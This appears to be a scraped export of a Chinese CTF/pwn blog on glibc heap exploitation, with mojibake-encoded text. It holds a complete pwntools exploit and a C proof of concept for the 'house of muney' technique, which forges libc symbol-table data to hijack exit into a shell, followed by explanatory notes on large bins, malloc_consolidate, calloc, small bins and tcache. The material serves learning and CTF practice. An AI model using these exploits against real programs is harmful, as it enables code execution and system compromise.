0ï¼Œåˆ™è¡¨ç¤ºä¸æ˜¯æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œç»§ç»­å¾ªç¯æŸ¥æ‰¾ while ((*hasharr++ \u0026amp; 1u) == 0); } } //.... } #\råˆ©ç”¨æ”»å‡» #\råˆ©ç”¨æµç¨‹ #\rmalloc \u0026gt; 128kçš„å†…å­˜ ä¿®æ”¹è¯¥chunkçš„sizeï¼Œä½¿å…¶å¤§åˆ°èƒ½è¦†ç›–æ‰libcçš„ä¸€äº›åœ°å€ freeè¯¥åœ°å€ ç„¶åmalloc æ›´å¤§çš„å†…å­˜ è®¡ç®—å½“å‰chunkçš„åœ°å€åˆ°libcçš„åœ°å€è·ç¦» ï¼ˆè°ƒè¯•å¾—å‡ºï¼Œç¬¬ä¸€æ­¥mallocæ—¶ï¼Œå–libcçš„åœ°å€ - (ç¬¬å››æ­¥mallocçš„åœ°å€+0x10)ï¼‰ è®¡ç®—åˆ°å¸ƒéš†è¿‡æ»¤å™¨(bitmask)æ•°ç»„çš„åç§» ï¼ˆ.gnu.hashçš„åœ°å€ + 16ï¼‰ è®¡ç®—åˆ°å“ˆå¸Œæ¡¶(bucket)æ•°ç»„çš„åç§» ( bloom çš„åç§» + bloom_size * 8) è®¡ç®—bitmask_wordçš„åœ¨bitmaskä¸­index è®¡ç®—bitmask_wordçš„åœ°å€ è·å–bitmask_wordçš„å€¼ è®¡ç®—ç›®æ ‡ç¬¦å·åœ¨å“ˆå¸Œæ¡¶ä¸­çš„index (exit_hash % æ¡¶æ•°(nbucket)) è®¡ç®—è¯¥bucketçš„åœ°å€ è·å–buketçš„å€¼ï¼Œä¸ºç›®æ ‡ç¬¦å·åœ¨buketä¸­çš„å€¼ã€‚ è®¡ç®—åˆ°l_gnu_chain_zeroå“ˆå¸Œé“¾æ•°ç»„ï¼ˆGNU å“ˆå¸Œè¡¨çš„é“¾æ•°ç»„èµ·å§‹åœ°å€ï¼‰çš„è·ç¦» è®¡ç®—åˆ°ç›®æ ‡ç¬¦å·çš„ç¬¦å·è¡¨çš„åç§» ä¼ªé€ ç¬¦å·è¡¨çš„æ•°æ®ç»“æ„ï¼Œå°†st_valueä¼ªé€ æˆç›®æ ‡åœ°å€ï¼Œå¦‚one_gadget,systemçš„åç§»åœ°å€ã€‚ ä¸ºä»€ä¹ˆä¸ç›´æ¥ä¼ªé€ st_value,åœ¨å·libcçš„åœ°å€çš„æ—¶å€™ï¼Œå·åˆ°çš„å†…å­˜ä¼šè¢«æ¸…ç©ºï¼Œæ‰€ä»¥éœ€è¦é‡æ–°ä¼ªé€ ã€‚\næŸé¢˜ï¼šexp #\rfrom pwn import * elf = ELF(\u0026#34;./pwn\u0026#34;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) io = process(\u0026#34;./pwn\u0026#34;) def add(index, size): io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;1\u0026#34;) io.sendlineafter(b\u0026#34;ID:\u0026#34;, str(index).encode()) io.sendlineafter(b\u0026#34;size:\u0026#34;, str(size).encode()) def free(index): io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;2\u0026#34;) io.sendlineafter(b\u0026#34;remove:\u0026#34;, str(index).encode()) def edit(index, offset, content): io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;3\u0026#34;) io.sendlineafter(b\u0026#34;update:\u0026#34;, str(index).encode()) io.sendlineafter(b\u0026#34;length:\u0026#34;, str(offset).encode()) io.sendafter(b\u0026#34;details:\u0026#34;, content) def show(index): io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;4\u0026#34;) io.sendlineafter(b\u0026#34;view:\u0026#34;, str(index).encode()) def dbg(): gdb.attach(io) pause() add(0, 0x40000 - 0x2000) #dbg() edit(0,-8, p64(0x41002 + 0x5000 + 0x4000)) free(0) add(0, 0x41000 * 2 + 0x4000) base_off = 0x7dff0 one_gadget = [0xe3afe, 0xe3b01, 0xe3b04][1] gnu_hash_section = libc.get_section_by_name(\u0026#39;.gnu.hash\u0026#39;) dynsym_section = libc.get_section_by_name(\u0026#39;.dynsym\u0026#39;) dynstr_section = libc.get_section_by_name(\u0026#39;.dynstr\u0026#39;) namehash = gnu_hash_section.gnu_hash(\u0026#39;exit\u0026#39;) # gnu_hash_section[\u0026#39;sh_addr\u0026#39;]è·å¾—gun.hashåç§»ã€‚ bloom_off = gnu_hash_section[\u0026#39;sh_addr\u0026#39;] + 4 * gnu_hash_section._wordsize bucket_off = bloom_off + gnu_hash_section.params[\u0026#39;bloom_size\u0026#39;] * gnu_hash_section._xwordsize bloom_elem_idx = int(namehash / gnu_hash_section.elffile.elfclass) % gnu_hash_section.params[\u0026#39;bloom_size\u0026#39;] bloom_elem_off = bloom_off + bloom_elem_idx * gnu_hash_section._xwordsize bloom_elem_val = gnu_hash_section.params[\u0026#39;bloom\u0026#39;][bloom_elem_idx] bucket_elem_idx = namehash % gnu_hash_section.params[\u0026#39;nbuckets\u0026#39;] bucket_elem_off = bucket_off + bucket_elem_idx * gnu_hash_section._wordsize bucket_elem_val = gnu_hash_section.params[\u0026#39;buckets\u0026#39;][bucket_elem_idx] hasharr_off = gnu_hash_section._chain_pos + (bucket_elem_val - gnu_hash_section.params[\u0026#39;symoffset\u0026#39;]) * gnu_hash_section._wordsize sym_off = dynsym_section[\u0026#39;sh_offset\u0026#39;] + bucket_elem_val * dynsym_section[\u0026#39;sh_entsize\u0026#39;] sym_value = b\u0026#39;\u0026#39; sym_value += p32(libc.search(b\u0026#39;exit\\x00\u0026#39;).__next__() - dynstr_section[\u0026#39;sh_offset\u0026#39;]) # st_name sym_value += p8(0x12) # st_info é«˜4ä½ï¼š0x1 è¡¨ç¤º STB_GLOBALï¼ˆå…¨å±€ç¬¦å·ï¼‰ä½4ä½ï¼š0x2 è¡¨ç¤º STT_FUNCï¼ˆå‡½æ•°ç±»å‹ï¼‰ sym_value += p8(0) # st_other é€šå¸¸ä¸º0 sym_value += p16(1) # st_shndx 1è¡¨ç¤ºåœ¨ä»£ç èŠ‚ä¸­ sym_value += p64(one_gadget) # st_value sym_value += p64(100) # st_size éšæ„è®¾ç½®,åŠ¨æ€é“¾æ¥å™¨é€šå¸¸ä¸éªŒè¯æ­¤å­—æ®µ #dbg() edit(0, base_off + bloom_elem_off, p64(bloom_elem_val)) edit(0, base_off + bucket_elem_off, p32(bucket_elem_val)) edit(0, base_off + hasharr_off, p32(namehash)) edit(0, base_off + sym_off, sym_value) #gdb.attach(io, \u0026#34;b _dl_fixup\\nc\u0026#34;) io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;5\u0026#34;) io.interactive() POC #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; void main() { setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); char *strptr = mmap(0xdeadb000, 0x1000, 6, 0x22, -1, 0); strcpy(strptr, \u0026#34;/bin/sh\u0026#34;); puts(\u0026#34;[*] step1: allocate a chunk ---\u0026gt; void* ptr = malloc(0x40000);\u0026#34;); size_t *ptr = (size_t *)malloc(0x40000); size_t sz = ptr[-1]; printf(\u0026#34;[*] ptr address: %p, chunk size: %p\\n\u0026#34;, ptr, (void *)sz); puts(\u0026#34;[*] step2: change the size of the chunk ---\u0026gt; ptr[-1] += 0x5000;\u0026#34;); ptr[-1] += 0x5000; puts(\u0026#34;[*] step3: free ptr and steal heap from glibc ---\u0026gt; free(ptr);\u0026#34;); free(ptr); puts(\u0026#34;[*] step4: retrieve heap ---\u0026gt; ptr = malloc(0x41000 * 2);\u0026#34;); ptr = malloc(0x41000 * 2); sz = ptr[-1]; printf(\u0026#34;[*] ptr address: %p, chunk size: %p\\n\u0026#34;, ptr, (void *)sz); // å½“å‰ptråˆ°åŸæœ‰libcåŸºåœ°å€çš„åç§» size_t base_off = 0x7dff0; // ä»¥ä¸‹åœ°å€å‡æ˜¯ç›¸å¯¹äºlibcåŸºåœ°å€çš„åç§» size_t system_off = 0x52290; size_t bitmask_word_off = 0xb88; size_t bucket_off = 0xcb0; size_t exit_sym_st_value_off = 0x4d20; size_t hasharr_off = 0x1d7c; puts(\u0026#34;[*] step5: set essential data for dl_runtime_resolve\u0026#34;); *(size_t *)((char *)ptr + base_off + bitmask_word_off) = 0xf000028c0200130eul; puts(\u0026#34;[*] set bitmask_word to 0xf000028c0200130eul\u0026#34;); *(unsigned int *)((char *)ptr + base_off + bucket_off) = 0x86u; puts(\u0026#34;[*] set bucket to 0x86u\u0026#34;); *(size_t *)((char *)ptr + base_off + exit_sym_st_value_off) = system_off; puts(\u0026#34;[*] set exit@sym.st_value to system_off 0x52290\u0026#34;); *(size_t *)((char *)ptr + base_off + exit_sym_st_value_off - 8) = 0xf001200002efbul; puts(\u0026#34;[*] set other exit@sym members\u0026#34;); *(size_t *)((char *)ptr + base_off + hasharr_off) = 0x7c967e3e7c93f2a0ul; puts(\u0026#34;[*] set hasharr to 0x7c967e3e7c93f2a0ul\u0026#34;); puts(\u0026#34;[*] step6: get shell ---\u0026gt; exit(\\\u0026#34;/bin/sh\\\u0026#34;)\u0026#34;); exit(strptr); } ","externalUrl":null,"permalink":"/posts/pwn/heap/house-of-%E7%B3%BB%E5%88%97/house-of-muney/","section":"æˆ‘çš„åšå®¢","summary":"","title":"","type":"posts"},{"content":"\rLarge bin attack #\rWhat\u0026rsquo;s large bin #\rlarge bin size å¤§äº512å­—èŠ‚çš„chunkç§°ä¹‹ä¸ºlarge chunk\nlarge binçš„æ•°é‡ï¼š63ä¸ªã€‚Large binç±»ä¼¼äºsmall binï¼Œåªæ˜¯éœ€è¦æ³¨æ„ä¸¤ç‚¹ï¼šä¸€æ˜¯åŒä¸€ä¸ªlarge binä¸­æ¯ä¸ªchunkçš„å¤§å°å¯ä»¥ä¸ä¸€æ ·ï¼Œä½†å¿…é¡»å¤„äºæŸä¸ªç»™å®šçš„èŒƒå›´ã€‚\nå‰32ä¸ªlarge binä¾æ¬¡ä»¥64å­—èŠ‚æ­¥é•¿ä¸ºé—´éš”ï¼Œå³ç¬¬ä¸€ä¸ªlarge binä¸­chunk sizeä¸º512~575å­—èŠ‚ï¼Œç¬¬äºŒä¸ªlarge binä¸­chunk sizeä¸º576 ~ 639å­—èŠ‚ã€‚ç´§éšå…¶åçš„16ä¸ªlarge binä¾æ¬¡ä»¥512å­—èŠ‚æ­¥é•¿ä¸ºé—´éš”ï¼›ä¹‹åçš„8ä¸ªbinä»¥æ­¥é•¿4096ä¸ºé—´éš”ï¼›å†ä¹‹åçš„4ä¸ªbinä»¥32768å­—èŠ‚ä¸ºé—´éš”ï¼›ä¹‹åçš„2ä¸ªbinä»¥262144å­—èŠ‚ä¸ºé—´éš”ï¼›å‰©ä¸‹çš„chunkå°±æ”¾åœ¨æœ€åä¸€ä¸ªlarge binä¸­ã€‚\nlarge chunkå¯ä»¥æ·»åŠ ã€åˆ é™¤åœ¨large binçš„ä»»ä½•ä¸€ä¸ªä½ç½®ã€‚\nåˆå¹¶æ“ä½œï¼šç±»ä¼¼äºsmall binã€‚\nmalloc(large chunk)æ“ä½œï¼š\nâ€‹\tåˆå§‹åŒ–å®Œæˆä¹‹å‰çš„æ“ä½œç±»ä¼¼äºsmall binï¼Œè¿™é‡Œä¸»è¦è®¨è®ºlarge binsåˆå§‹åŒ–å®Œæˆä¹‹åçš„æ“ä½œã€‚é¦–å…ˆç¡®å®šç”¨æˆ·è¯·æ±‚çš„å¤§å°å±äºå“ªä¸€ä¸ªlarge binï¼Œç„¶ååˆ¤æ–­è¯¥large binä¸­æœ€å¤§çš„chunkçš„sizeæ˜¯å¦å¤§äºç”¨æˆ·è¯·æ±‚çš„size(åªéœ€è¦å¯¹æ¯”é“¾è¡¨ä¸­front endçš„sizeå³å¯)ã€‚å¦‚æœå¤§äºï¼Œå°±ä»rear endå¼€å§‹éå†è¯¥large binï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªsizeç›¸ç­‰æˆ–æ¥è¿‘çš„chunkï¼Œåˆ†é…ç»™ç”¨æˆ·ã€‚å¦‚æœè¯¥chunkå¤§äºç”¨æˆ·è¯·æ±‚çš„sizeçš„è¯ï¼Œå°±å°†è¯¥chunkæ‹†åˆ†ä¸ºä¸¤ä¸ªchunkï¼šå‰è€…è¿”å›ç»™ç”¨æˆ·ï¼Œä¸”sizeç­‰åŒäºç”¨æˆ·è¯·æ±‚çš„sizeï¼›å‰©ä½™çš„éƒ¨åˆ†åšä¸ºä¸€ä¸ªæ–°çš„chunkæ·»åŠ åˆ°unsorted binä¸­ã€‚\nâ€‹\tå¦‚æœè¯¥large binä¸­æœ€å¤§çš„chunkçš„sizeå°äºç”¨æˆ·è¯·æ±‚çš„sizeçš„è¯ï¼Œé‚£ä¹ˆå°±ä¾æ¬¡æŸ¥çœ‹åç»­çš„large binä¸­æ˜¯å¦æœ‰æ»¡è¶³éœ€æ±‚çš„chunkï¼Œä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯é‰´äºbinçš„ä¸ªæ•°è¾ƒå¤š(ä¸åŒbinä¸­çš„chunkææœ‰å¯èƒ½åœ¨ä¸åŒçš„å†…å­˜é¡µä¸­)ï¼Œå¦‚æœæŒ‰ç…§ä¸Šä¸€æ®µä¸­ä»‹ç»çš„æ–¹æ³•è¿›è¡Œéå†çš„è¯(å³éå†æ¯ä¸ªbinä¸­çš„chunk)ï¼Œå°±å¯èƒ½ä¼šå‘ç”Ÿå¤šæ¬¡å†…å­˜é¡µä¸­æ–­æ“ä½œï¼Œè¿›è€Œä¸¥é‡å½±å“æ£€ç´¢é€Ÿåº¦ï¼Œæ‰€ä»¥glibc mallocè®¾è®¡äº†Binmapç»“æ„ä½“æ¥å¸®åŠ©æé«˜bin-by-binæ£€ç´¢çš„é€Ÿåº¦ã€‚Binmapè®°å½•äº†å„ä¸ªbinä¸­æ˜¯å¦ä¸ºç©ºï¼Œé€šè¿‡bitmapå¯ä»¥é¿å…æ£€ç´¢ä¸€äº›ç©ºçš„binã€‚å¦‚æœé€šè¿‡binmapæ‰¾åˆ°äº†ä¸‹ä¸€ä¸ªéç©ºçš„large binçš„è¯ï¼Œå°±æŒ‰ç…§ä¸Šä¸€æ®µä¸­çš„æ–¹æ³•åˆ†é…chunkï¼Œå¦åˆ™å°±ä½¿ç”¨top chunkæ¥åˆ†é…åˆé€‚çš„å†…å­˜ã€‚\nFree(large chunk)ï¼šç±»ä¼¼äºsmall chunkã€‚ Glibc 2.27 large bin attack #\râ€‹\n","externalUrl":null,"permalink":"/posts/pwn/heap/large_bin_attack/","section":"æˆ‘çš„åšå®¢","summary":"","title":"","type":"posts"},{"content":"\rMemory #\rmalloc #\rmalloc_chunk #\rstruct malloc_chunk { INTERNAL_SIZE_T prev_size; // å‰ä¸€ä¸ª chunk çš„å¤§å°ï¼ˆå¦‚æœç©ºé—²ï¼‰ INTERNAL_SIZE_T size; // å½“å‰ chunk çš„å¤§å°ï¼ŒåŒ…æ‹¬å¤´éƒ¨ struct malloc_chunk* fd; // æŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—² chunk struct malloc_chunk* bk; // æŒ‡å‘ä¸Šä¸€ä¸ªç©ºé—² chunk struct malloc_chunk* fd_nextsize; // æŒ‡å‘ä¸‹ä¸€ä¸ªä¸åŒå¤§å°çš„ç©ºé—² chunk struct malloc_chunk* bk_nextsize; // æŒ‡å‘ä¸Šä¸€ä¸ªä¸åŒå¤§å°çš„ç©ºé—² chunk }; size å­—æ®µçš„äºŒè¿›åˆ¶ç»“æ„ ä½ä½ç½®ï¼ˆä½â†’é«˜ï¼‰ åç§° æè¿° ç¬¬ 0 ä½ PREV_INUSE (P) å‰ä¸€ä¸ª chunk æ˜¯å¦åœ¨ä½¿ç”¨ä¸­ã€‚ ç¬¬ 1 ä½ IS_MMAPPED (M) å½“å‰ chunk æ˜¯å¦ç”± mmap ç›´æ¥åˆ†é…ï¼ˆéå †åŒºå†…å­˜ï¼‰ã€‚ ç¬¬ 2 ä½ NON_MAIN_ARENA (A) å½“å‰ chunk æ˜¯å¦å±äºéä¸»åˆ†é…åŒºï¼ˆå¦‚çº¿ç¨‹æœ¬åœ°å †ï¼‰ malloc_consolidate #\rglibc.2.39æºç \nstatic void malloc_consolidate(mstate av) { mfastbinptr* fb; /* current fastbin being consolidated */ mfastbinptr* maxfb; /* last fastbin (for loop control) */ mchunkptr p; /* current chunk being consolidated */ mchunkptr nextp; /* next chunk to consolidate */ mchunkptr unsorted_bin; /* bin header */ mchunkptr first_unsorted; /* chunk to link to */ /* These have same use as in free() */ mchunkptr nextchunk; INTERNAL_SIZE_T size; INTERNAL_SIZE_T nextsize; INTERNAL_SIZE_T prevsize; int nextinuse; atomic_store_relaxed (\u0026amp;av-\u0026gt;have_fastchunks, false); unsorted_bin = unsorted_chunks(av); //è·å–unsortbin å¤´ /* Remove each chunk from fast bin and consolidate it, placing it then in unsorted bin. Among other reasons for doing this, placing in unsorted bin avoids needing to calculate actual bins until malloc is sure that chunks aren\u0026#39;t immediately going to be reused anyway. */ maxfb = \u0026amp;fastbin (av, NFASTBINS - 1); fb = \u0026amp;fastbin (av, 0); do { p = atomic_exchange_acquire (fb, NULL); if (p != 0) { do { { if (__glibc_unlikely (misaligned_chunk (p))) malloc_printerr (\u0026#34;malloc_consolidate(): \u0026#34; \u0026#34;unaligned fastbin chunk detected\u0026#34;); unsigned int idx = fastbin_index (chunksize (p)); if ((\u0026amp;fastbin (av, idx)) != fb) malloc_printerr (\u0026#34;malloc_consolidate(): invalid chunk size\u0026#34;); } check_inuse_chunk(av, p); nextp = REVEAL_PTR (p-\u0026gt;fd); /* Slightly streamlined version of consolidation code in free() */ size = chunksize (p); nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); if (__glibc_unlikely (chunksize(p) != prevsize)) malloc_printerr (\u0026#34;corrupted size vs. prev_size in fastbins\u0026#34;); unlink_chunk (av, p); } if (nextchunk != av-\u0026gt;top) { nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) { size += nextsize; unlink_chunk (av, nextchunk); } else clear_inuse_bit_at_offset(nextchunk, 0); first_unsorted = unsorted_bin-\u0026gt;fd; unsorted_bin-\u0026gt;fd = p; first_unsorted-\u0026gt;bk = p; if (!in_smallbin_range (size)) { p-\u0026gt;fd_nextsize = NULL; p-\u0026gt;bk_nextsize = NULL; } set_head(p, size | PREV_INUSE); p-\u0026gt;bk = unsorted_bin; p-\u0026gt;fd = first_unsorted; set_foot(p, size); } else { size += nextsize; set_head(p, size | PREV_INUSE); av-\u0026gt;top = p; } } while ( (p = nextp) != 0); } } while (fb++ != maxfb); } static void * _int_malloc (mstate av, size_t bytes) { ... ... if ((unsigned long) (nb) \u0026lt;= (unsigned long) (get_max_fast ())) { ... ... } if (in_smallbin_range (nb)) { ... ... } else { idx = largebin_index (nb); if (atomic_load_relaxed (\u0026amp;av-\u0026gt;have_fastchunks)) malloc_consolidate (av); //chunkå¤§å° \u0026gt; 0x410è§¦å‘malloc_consolidateã€‚ } ä»£ç é€»è¾‘ #\rå½“chunkå¤§å° \u0026gt;= 0x410 è§¦å‘ malloc_consolidate()\n1. åˆå§‹åŒ– #\ræ ‡è®° have_fastchunks ä¸º falseï¼šè¡¨ç¤º fast bins å³å°†è¢«æ¸…ç©ºã€‚ è·å– unsorted_bin å¤´æŒ‡é’ˆï¼šç”¨äºåç»­æ’å…¥åˆå¹¶åçš„å—ã€‚ è®¡ç®— fast bins çš„èµ·å§‹ (fb) å’Œç»“æŸ (maxfb)ï¼šéå†æ‰€æœ‰ fast binsã€‚ 2. éå† fast bins #\rå¤–å±‚å¾ªç¯ï¼šé€ä¸ªå¤„ç†ä» 0 åˆ° NFASTBINS-1 çš„ fast binã€‚ åŸå­æ“ä½œï¼šä½¿ç”¨ atomic_exchange_acquire æ¸…ç©ºå½“å‰ fast bin çš„é“¾è¡¨ï¼Œé¿å…å¤šçº¿ç¨‹ç«äº‰ã€‚ 2.1 æ ¡éªŒ chunk åˆæ³•æ€§ #\rå†…å­˜å¯¹é½æ£€æŸ¥ï¼šé˜²æ­¢æ”»å‡»è€…ä¼ªé€  chunk å…ƒæ•°æ®ã€‚ fast bin ç´¢å¼•éªŒè¯ï¼šç¡®ä¿ chunk å¤§å°ä¸å½“å‰ fast bin åŒ¹é…ã€‚ 2.2 åˆå¹¶å‰å‘ç©ºé—²å— #\ræ£€æŸ¥ prev_inuse ä½ï¼šè‹¥ä¸º 0ï¼Œè¡¨ç¤ºå‰ä¸€ä¸ª chunk ç©ºé—²ã€‚ åˆå¹¶é€»è¾‘ï¼š è®¡ç®—å‰å‘ chunk çš„ä½ç½® (p = chunk_at_offset(p, -prevsize)) éªŒè¯å‰å‘ chunk çš„å¤§å°æ˜¯å¦ä¸ prevsize ä¸€è‡´ï¼ˆé˜²å¾¡å †æº¢å‡ºï¼‰ã€‚ è°ƒç”¨ unlink_chunk ä» bin ä¸­ç§»é™¤å‰å‘ chunkã€‚ æ›´æ–°å½“å‰ chunk çš„ sizeã€‚ 2.3 åˆå¹¶åå‘ç©ºé—²å— #\ræ£€æŸ¥ next chunk æ˜¯å¦ä¸º top chunkï¼š è‹¥æ˜¯ï¼Œç›´æ¥åˆå¹¶åˆ° top chunkã€‚ è‹¥å¦ï¼Œæ£€æŸ¥ nextinuse ä½ï¼š è‹¥ç©ºé—²ï¼šåˆå¹¶ next chunkï¼Œè°ƒç”¨ unlink_chunkã€‚ è‹¥åœ¨ä½¿ç”¨ä¸­ï¼šä»…æ¸…é™¤ next chunk çš„ prev_inuse ä½ã€‚ 2.4 æ’å…¥ unsorted bin #\ré“¾æ¥åˆ° unsorted bin å¤´éƒ¨ï¼š å°†åˆå¹¶åçš„å—æ’å…¥ unsorted_bin-\u0026gt;fdã€‚ æ›´æ–° first_unsorted-\u0026gt;bk æŒ‡å‘æ–°å—ã€‚ å¤„ç† large chunkï¼šè‹¥åˆå¹¶åçš„å—å¤§å°è¶…å‡º small bin èŒƒå›´ï¼Œæ¸…ç©º fd_nextsize å’Œ bk_nextsizeã€‚ è®¾ç½®å…ƒæ•°æ®ï¼š set_head(p, size | PREV_INUSE)ï¼šæ ‡è®°å½“å‰å—å¤§å°å’Œ prev_inuse ä½ã€‚ set_foot(p, size)ï¼šè®¾ç½® next chunk çš„ prev_sizeï¼ˆä»…é™ç©ºé—²å—ï¼‰ã€‚ 2.5 åˆå¹¶åˆ° top chunk #\rè‹¥ next chunk æ˜¯ top chunkï¼Œç›´æ¥å°†åˆå¹¶åçš„å—åŠ å…¥ topï¼Œå¹¶æ›´æ–° av-\u0026gt;top æŒ‡é’ˆã€‚ callocåˆ†é… #\rç‰¹æ€§ #\rcallocä¸ä¼šä»fastbinså’Œtcache binä¸­åˆ†é…å†…å­˜ï¼ˆå³ä½¿è¯·æ±‚å¤§å°åŒ¹é…ï¼‰ï¼Œå› ä¸ºfastbinsçš„chunkå¯èƒ½æœªåˆå¹¶ï¼Œæ— æ³•ä¿è¯è¿ç»­ç©ºé—´ã€‚ åˆ†é…æ—¶ä¼˜å…ˆä»smallbins/unsortedbinsæˆ–top chunkåˆ‡å‰²ã€‚ callocä»small bin ä¸­æ‹¿å‡ºä¸€ä¸ªç©ºé—²chunkåï¼Œä¼šå°†å…¶ä½™chunkæ”¾å…¥tcache bin ä¸­ï¼ˆç›´åˆ°å¡«æ»¡ï¼‰ï¼Œå¹¶ä¸”åªä¼šæ£€æµ‹å¯¹ç¬¬ä¸€ä¸ª chunkè¿›è¡Œäº†å®Œæ•´æ€§æ£€æŸ¥ï¼Œåé¢çš„chunkçš„æ£€æŸ¥ç¼ºå¤±ï¼Œå°±é€ æˆäº†fake chunkã€‚ free #\r","externalUrl":null,"permalink":"/posts/pwn/heap/memory_function/","section":"æˆ‘çš„åšå®¢","summary":"","title":"","type":"posts"},{"content":"\rSmall bin attack #\rWhat\u0026rsquo;s small bin? #\rsmall binä¸ªæ•°ï¼š62ä¸ªï¼Œæ¯ä¸ªsmall binä¹Ÿæ˜¯ä¸€ä¸ªç”±å¯¹åº”free chunkç»„æˆçš„å¾ªç¯åŒé“¾è¡¨ã€‚ small biné‡‡ç”¨FIFO(å…ˆå…¥å…ˆå‡º)ç®—æ³•ã€‚ small bin sizeï¼šç¬¬ä¸€ä¸ªchunkå¤§å°ä¸º16å­—èŠ‚ï¼Œåç»­æ¯ä¸ªsmall binä¸­chunkçš„å¤§å°ä¾æ¬¡å¢åŠ 8å­—èŠ‚ï¼Œå³æœ€åä¸€ä¸ªsmall binçš„chunkä¸º16 + 62 * 8 = 512å­—èŠ‚ã€‚ åˆå¹¶æ“ä½œï¼šç›¸é‚»çš„free chunkéœ€è¦è¿›è¡Œåˆå¹¶æ“ä½œï¼Œå³åˆå¹¶æˆä¸€ä¸ªå¤§çš„free chunkã€‚å…·ä½“æ“ä½œè§ä¸‹æ–‡free(small chunk)ä»‹ç»ã€‚ malloc(small chunk)æ“ä½œï¼šç±»ä¼¼äºfast binsï¼Œæœ€åˆæ‰€æœ‰çš„small binéƒ½æ˜¯ç©ºçš„ï¼Œå› æ­¤åœ¨å¯¹è¿™äº›small binå®Œæˆåˆå§‹åŒ–ä¹‹å‰ï¼Œå³ä½¿ç”¨æˆ·è¯·æ±‚çš„å†…å­˜å¤§å°å±äºsmall chunkä¹Ÿä¸ä¼šäº¤ç”±small binè¿›è¡Œå¤„ç†ï¼Œè€Œæ˜¯äº¤ç”±unsorted binå¤„ç†ï¼Œå¦‚æœunsorted binä¹Ÿä¸èƒ½å¤„ç†çš„è¯ï¼Œglibc mallocå°±ä¾æ¬¡éå†åç»­çš„æ‰€æœ‰binsï¼Œæ‰¾å‡ºç¬¬ä¸€ä¸ªæ»¡è¶³è¦æ±‚çš„binï¼Œå¦‚æœæ‰€æœ‰çš„binéƒ½ä¸æ»¡è¶³çš„è¯ï¼Œå°±è½¬è€Œä½¿ç”¨top chunkï¼Œå¦‚æœtop chunkå¤§å°ä¸å¤Ÿï¼Œé‚£ä¹ˆå°±æ‰©å……top chunkï¼Œè¿™æ ·å°±ä¸€å®šèƒ½æ»¡è¶³éœ€æ±‚äº†(è¿˜è®°å¾—ä¸Šä¸€ç¯‡æ–‡ç« ä¸­åœ¨Top Chunkä¸­ç•™ä¸‹çš„é—®é¢˜ä¹ˆï¼Ÿç­”æ¡ˆå°±åœ¨è¿™é‡Œ)ã€‚æ³¨æ„éå†åç»­binsä»¥åŠä¹‹åçš„æ“ä½œåŒæ ·è¢«large binæ‰€ä½¿ç”¨ã€‚ free(small chunk)ï¼šå½“é‡Šæ”¾small chunkçš„æ—¶å€™ï¼Œå…ˆæ£€æŸ¥è¯¥chunkç›¸é‚»çš„chunkæ˜¯å¦ä¸ºfreeï¼Œå¦‚æœæ˜¯çš„è¯å°±è¿›è¡Œåˆå¹¶æ“ä½œï¼šå°†è¿™äº›chunksåˆå¹¶æˆæ–°çš„chunkï¼Œç„¶åå°†å®ƒä»¬ä»small binä¸­ç§»é™¤ï¼Œæœ€åå°†æ–°çš„chunkæ·»åŠ åˆ°unsorted binä¸­ã€‚ ","externalUrl":null,"permalink":"/posts/pwn/heap/small_bin_attack/","section":"æˆ‘çš„åšå®¢","summary":"","title":"","type":"posts"},{"content":"\rTcache Attack #\rWhat\u0026rsquo;s Tcacheï¼Ÿ #\rGlibc2.26åçš„ç¼“å†²æœºåˆ¶ã€‚\néµå¾ªLIFO(åè¿›å…ˆå‡º)åŸåˆ™ï¼Œå’Œfastbinã€stackä¸€æ ·ã€‚ã€\nç¨‹åºæ¯å½“ä»fastbin/small binä¸­å–å‡ºä¸€ä¸ªå †å—ï¼Œä¼šå°è¯•æŠŠè¯¥binä¸­å‰©ä½™çš„å †å—æ‹¿å‡ºæ¥å»å¡«å……tcacheã€‚\nåŒä¸€ä¸ªå¤§å°chunkçš„chunkæœ€å¤šå­˜æ”¾7ä¸ª\nTcache Size ã€‚\nx64: 0x18 \u0026mdash; 0x408\nx86: 0xC \u0026mdash; 0x200\nGlibc2.35ä»¥åï¼Œå‡ºç°åœ°å€åŠ å¯†æœºåˆ¶ï¼Œfdå­˜æ”¾ä¸‹ä¸€ä¸ªchunkåœ°å€å¼‚æˆ–åçš„å€¼\nç®—æ³•ï¼š(å½“å‰åœ°å€ \u0026raquo; 12) xor å½“å‰åœ°å€\nè¿™é‡Œçš„keyå­˜æ”¾åœ¨Tcacheé“¾ä¸­æœ«å°¾chunkçš„fdä¸­ã€‚\nTcache Double Free #\råˆ©ç”¨æ–¹å¼æ€»ç»“ #\rç ´åæ‰è¢« free çš„å †å—ä¸­çš„ keyï¼Œç»•è¿‡æ£€æŸ¥ï¼ˆå¸¸ç”¨ï¼‰ æ”¹å˜è¢« free çš„å †å—çš„å¤§å°ï¼Œéå†æ—¶è¿›å…¥å¦ä¸€ idx çš„ entries House of botcakeï¼ˆå¸¸ç”¨ï¼‰ Tcache dup #\ræ›´æ”¹keyå€¼ #\ré€‚ç”¨glibc 2.29åŠä»¥ä¸Šç‰ˆæœ¬ã€‚ glibc 2.29å¢åŠ äº†æ–°çš„æ£€æµ‹æœºåˆ¶\ntypedef struct tcache_entry { struct tcache_entry *next; /* This field exists to detect double frees. */ uintptr_t key; } tcache_entry; #if USE_TCACHE { 